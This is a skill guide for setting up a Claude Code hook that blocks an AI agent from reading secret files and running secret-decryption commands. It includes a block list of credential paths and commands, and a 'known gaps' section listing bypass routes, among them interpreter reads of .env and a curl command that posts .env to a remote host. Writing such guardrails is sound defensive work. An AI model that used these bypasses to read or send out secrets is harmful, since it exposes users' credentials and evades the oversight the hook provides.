---
name: secret-guardrails-claude-code
description: Set up Claude Code hooks to block Claude from reading secrets files (.env, credentials, keys, etc.) and running secret-decryption / secret-store commands (sops, gpg, vault, op, AWS Secrets Manager, kubectl get secret / logs, etc.). Use when user wants to prevent accidental secret disclosure, add secret-access guardrails, or restrict .env / sops / vault access in Claude Code.
---

# Setup Secret Guardrails

Sets up a PreToolUse hook that intercepts and blocks attempts to read secrets files or run secret-decryption / secret-store commands before they execute.

## What Gets Blocked

### File access (Read / Edit / Write / NotebookEdit)

Paths matching any of these are blocked:

- `.env` and variants (`.env.local`, `.env.production`, ...) — except `.env.example`, `.env.sample`, `.env.template`, `.env.dist`, `.env.test`
- `secrets.{yml,yaml,json,toml,env}`, `*-secrets.*`, `*_secret.*`, etc.
- `credentials`, `credentials.{yml,yaml,json,toml}`
- `.netrc`, `.npmrc`, `.pypirc`, `.pgpass`, `.envrc`, `.git-credentials`
- `~/.aws/credentials`, `~/.aws/config`, `~/.kube/config`, `kubeconfig`, `~/.docker/config.json`
- `~/.config/gcloud/`, `~/.config/op/`
- `~/.ssh/*` (private keys + everything else) — except `*.pub`, `known_hosts`, `authorized_keys`, `.ssh/config`
- `~/.gnupg/*`
- Rails `config/master.key`, `config/credentials.yml.enc`
- `wp-config.php`
- `*.pem`, `*.key`, `*.pfx`, `*.p12`, `*.jks`, `*.keystore`
- SSH private key filenames (`id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`) at any depth
- `*.tfstate`, `*.tfstate.backup`
- `terraform.tfvars`, `secrets.tfvars`, `prod.tfvars`, `production.tfvars`, `staging.tfvars`, `*.auto.tfvars` — except `*.example.tfvars` / `example.tfvars`

### Bash commands

**Secret-management / decrypt tools:**

- `sops -d|--decrypt|decrypt|d|exec-env|exec-file`
- `gpg --decrypt|-d`
- `age --decrypt|-d`
- `pass show|otp|edit|cp`
- `op item|read|get|signin|inject|run` (1Password CLI)
- `bw get|unlock|export` (Bitwarden CLI)
- `vault read|kv get|login|operator unseal`
- `aws secretsmanager get-secret-value`
- `aws ssm get-parameter --with-decryption`
- `aws kms decrypt`
- `gcloud secrets versions access`
- `gcloud kms decrypt`
- `az keyvault secret show`
- `doppler secrets get|download|run`
- `chamber exec|read|env`
- `infisical secrets|run|export`
- `kubectl get|describe secret(s)`
- `kubectl logs` (per project policy — can expose secrets in application logs)
- `helm get values` (often renders secrets)

**Shell-based reads of any secret file path** — `cat`, `less`, `more`, `head`, `tail`, `bat`, `view`, `nano`, `vim`, `vi`, `emacs`, `sed`, `awk`, `xxd`, `od`, `hexdump`, `strings`, `grep`, `rg`, `fgrep`, `egrep`, `dd`, `base64`, `openssl`, `cp`, `mv`, `tar`, `zip` — when any token in the command matches a secret path pattern above.

### Fail-closed on malformed input

If the hook receives empty or unparseable JSON, it blocks rather than allows.

## What's NOT covered (known gaps)

- **Indirect exfiltration**: `python -c "print(open('.env').read())"` — interpreter-as-reader. Adding language interpreters to the read-command list is a tradeoff; not done by default.
- **Multi-step relocation then read**: e.g. `cp .env /tmp/foo.txt && cat /tmp/foo.txt`. The `cp` step is blocked, but a more obfuscated chain could slip through.
- **Environment variables already in memory**: `printenv | grep PASSWORD` is not blocked. The shell is allowed to read its own env; if the user pre-populated secrets there, this hook doesn't see them.
- **Network exfiltration**: `curl -X POST -d @.env https://...` — the `.env` token would match and trigger a block, but only because `curl` parses `@filename` — adjacent variants may bypass. `curl` is not in the read-command list because it has many legitimate uses.

These are acceptable gaps for a non-adversarial agent — the goal is to stop *accidental* secret disclosure, not a determined attacker. Tighten via custom patterns if the threat model demands it.

## Steps

### 1. Ask scope

Ask the user: install for **this project only** (`.claude/settings.json`) or **all projects** (`~/.claude/settings.json`)?

Recommend global — secrets concerns apply across every project.

### 2. Copy the hook script

The bundled script is at: [scripts/block-secret-access.sh](scripts/block-secret-access.sh)

Copy it to the target location based on scope:

- **Project**: `.claude/hooks/block-secret-access.sh`
- **Global**: `~/.claude/hooks/block-secret-access.sh`

### 3. Add hook to settings

Add to the appropriate settings file. The matcher must cover Read, Edit, Write, NotebookEdit, and Bash:

**Project** (`.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read|Edit|Write|NotebookEdit|Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/block-secret-access.sh"
          }
        ]
      }
    ]
  }
}
```

**Global** (`~/.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read|Edit|Write|NotebookEdit|Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash $HOME/.claude/hooks/block-secret-access.sh"
          }
        ]
      }
    ]
  }
}
```

If `PreToolUse` already has entries (e.g. the git guardrails hook), merge — add this as another entry in the array or another `hooks[]` item under the matching matcher.

### 4. Ask about customization

Ask the user if they want to:

- Add or remove any file path patterns (e.g. block `.tfvars` outright, exempt a specific path).
- Add or remove any Bash command patterns.
- Tighten further (e.g. add `curl` to the read-command list for `curl @.env` blocking).

Edit the copied script accordingly.

### 5. Verify

Run these quick tests against the deployed script:

```bash
H=<path-to-script>
# should BLOCK
echo '{"tool_name":"Read","tool_input":{"file_path":"/x/.env"}}' | bash $H; echo "exit=$?"
echo '{"tool_name":"Bash","tool_input":{"command":"sops -d secrets.yaml"}}' | bash $H; echo "exit=$?"
echo '{"tool_name":"Bash","tool_input":{"command":"cat .env"}}' | bash $H; echo "exit=$?"
# should ALLOW
echo '{"tool_name":"Read","tool_input":{"file_path":"/x/.env.example"}}' | bash $H; echo "exit=$?"
echo '{"tool_name":"Bash","tool_input":{"command":"git status"}}' | bash $H; echo "exit=$?"
```

Blocked cases exit with code 2 and print a `BLOCKED (secret-guardrails): ...` message to stderr. Allowed cases exit 0 silently.
